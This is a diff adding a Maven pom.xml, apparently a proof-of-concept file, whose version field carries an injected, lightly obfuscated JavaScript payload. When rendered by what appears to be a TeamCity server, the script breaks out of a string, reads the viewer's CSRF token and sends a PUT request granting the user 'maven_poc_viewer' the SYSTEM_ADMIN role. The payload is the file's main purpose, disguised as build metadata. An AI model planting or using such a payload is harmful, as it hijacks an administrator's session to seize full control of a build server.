@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<project xmlns="http://maven.apache.org/POM/4.0.0"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
+  <modelVersion>4.0.0</modelVersion>
+  <groupId>example.maven</groupId>
+  <artifactId>controlled-child</artifactId>
+  <version>1');s=String.fromCharCode(47);c=String.fromCharCode(58);h=new Headers;h.append('X-TC-CSRF-Token',BS.CSRF.getToken());o=new Object;o.method='PUT';o.headers=h;fetch('app'+s+'rest'+s+'users'+s+'username'+c+'maven_poc_viewer'+s+'roles'+s+'SYSTEM_ADMIN'+s+'g',o);('</version>
+  <packaging>pom</packaging>
+  <name>Maven controlled child</name>
+</project>
